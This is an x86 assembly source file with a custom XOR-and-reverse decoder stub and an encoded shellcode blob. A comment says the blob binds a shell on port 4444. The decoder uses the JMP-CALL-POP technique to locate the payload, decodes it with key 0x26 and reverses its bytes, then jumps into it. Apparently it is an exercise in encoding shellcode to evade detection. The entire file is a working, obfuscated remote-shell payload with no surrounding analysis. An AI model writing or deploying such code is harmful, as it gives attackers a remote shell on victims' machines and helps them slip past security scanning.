global _start   

section .text
_start:

 jmp short call_shellcode

decoder:
 pop esi	;pointer to shellcode
 push esi	;save pointer for later use

 xor eax, eax	;clear first, XOR-operand register
 xor ebx, ebx	;clear first, XOR-operand register
 xor ecx, ecx	;clear first, XOR-operand register
 xor edx, edx	;clear first, XOR-operand register

 mov cl,len	;set ECX counter to length of code, this will be decreased by one by "loop" command
 mov edx,ecx	;save length of code into edx
 dec edx	;adjust for the loop (-1)
 shr ecx,1	;divide ecx by 2^1, so counter will not step over the half of the code

myloop:
 mov al, byte [esi]		;get first byte from the encoded shellcode ; maybe xchg is better
 xor al,0x26
 mov ah, byte [esi+edx]		;get last  byte from the encoded shellcode ; maybe xchg is better
 xor ah,0x26
 mov byte [esi], ah		;put first byte to the last position in shellcode
 mov byte [esi+edx], al		;put last byte to the first position in shellcode
 sub edx,2			;decrease the pointer to the last byte by 2
 inc esi			;increase starting pointer

 loop myloop		;repeat and decrease ecx by 1

 jmp short Shellcode

call_shellcode:

 call decoder
;shellcode is bind on port 4444
 Shellcode: db 0xa6,0xeb,0x2d,0x96,0xc4,0xaf,0x76,0xc7,0xaf,0x76,0xc5,0xaf,0x48,0x4f,0x44,0x09,0x4e,0x4e,0x55,0x09,0x09,0x4e,0x76,0xe6,0x17,0xdf,0x5f,0x6f,0xa6,0xeb,0x19,0x96,0x24,0x97,0x7f,0xb5,0xa6,0xeb,0xc7,0xaf,0x70,0x74,0x74,0x23,0x95,0x40,0x96,0xa6,0xeb,0xc7,0xaf,0x70,0x75,0x22,0x95,0x40,0x96,0xa6,0xeb,0xc7,0xaf,0x70,0x77,0x36,0x4c,0xc7,0xaf,0x75,0x40,0x7a,0x37,0x4e,0x40,0x74,0xf4,0x17,0x7d,0x40,0x96,0xe0,0xaf,0xa6,0xeb,0xc7,0xaf,0x24,0x4c,0x75,0x65,0x75,0xfd,0x17,0x40,0x96,0xe6,0x17
 len:    equ $-Shellcode
